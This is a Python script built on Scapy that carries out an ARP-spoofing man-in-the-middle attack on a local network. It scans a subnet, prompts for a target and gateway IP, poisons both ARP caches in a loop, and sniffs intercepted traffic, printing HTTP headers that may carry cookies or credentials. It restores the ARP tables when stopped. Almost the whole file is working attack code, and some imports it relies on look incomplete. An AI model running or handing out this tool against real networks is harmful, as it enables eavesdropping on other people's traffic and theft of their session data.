from scapy.all import *  # Import all necessary functions and classes from Scapy
from threading import Thread  # Import threading module for running tasks in parallel
from arping import network_scan  # Import custom function for network scanning

def get_mac(ip):
    """
    Returns the MAC address of the target IP.
    Uses Scapy's getmacbyip function to obtain the MAC address.
    """
    mac = getmacbyip(ip)
    return mac

def arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    Spoofs the ARP tables of the target and gateway to intercept traffic.
    Sends ARP reply packets to both the target and gateway, pretending to be each other.
    """
    # Create ARP response packets for the target and gateway
    arp_response_host = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op=2)
    arp_response_gateway = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, op=2)

    print(f"[*] Starting ARP spoofing. Spoofing {target_ip} and {gateway_ip}")

    try:
        # Continuously send spoofed ARP responses every 2.5 seconds
        while True:
            send(arp_response_host, verbose=False)
            send(arp_response_gateway, verbose=False)
            time.sleep(2.5)
    except KeyboardInterrupt:
        # Restore the network when the user stops the script
        print("\n[*] Stopping ARP spoofing. Restoring network...")
        restore_network(target_ip, gateway_ip, target_mac, gateway_mac)
        print("[*] Network restored. Exiting.")

def restore_network(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    Restores the original ARP tables for the target and gateway.
    Sends correct ARP responses to both the target and gateway to undo the spoofing.
    """
    # Create ARP packets to restore the original MAC addresses
    restore_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=gateway_mac, hwdst=target_mac)
    restore_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwsrc=target_mac, hwdst=gateway_mac)

    # Send the restore packets multiple times to ensure the network is restored
    send(restore_target, verbose=False, count=5)
    send(restore_gateway, verbose=False, count=5)

def callback_function(packet):
    """
    Callback function to process sniffed packets.
    Checks if the packet contains TCP and Raw layers and extracts HTTP headers if present.
    """
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors="ignore")
        if "HTTP" in payload:
            headers = payload.split("\r\n")
            for header in headers:
                print(header)

def sniff_packet():
    """
    Sniffs packets on the network and processes them using the callback function.
    """
    print("[*] Sniffing packet on interface . . . .")
    sniff(prn=callback_function)  # Start sniffing packets and pass them to the callback function

if __name__ == "__main__":
    # Define the network to scan and prompt the user for target and gateway IP addresses
    network = "192.168.254.0/24"
    network_scan(network)
    print("\n\n")
    target_ip = input("Enter target IP: ")
    gateway_ip = input("Enter gateway IP: ")

    # Get the MAC addresses of the target and gateway
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    # Start ARP spoofing in a separate thread
    arp_spoof_thread = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip, target_mac, gateway_mac))
    arp_spoof_thread.start()

    # Start packet sniffing in a separate thread
    sniff_thread = threading.Thread(target=sniff_packet)
    sniff_thread.start()
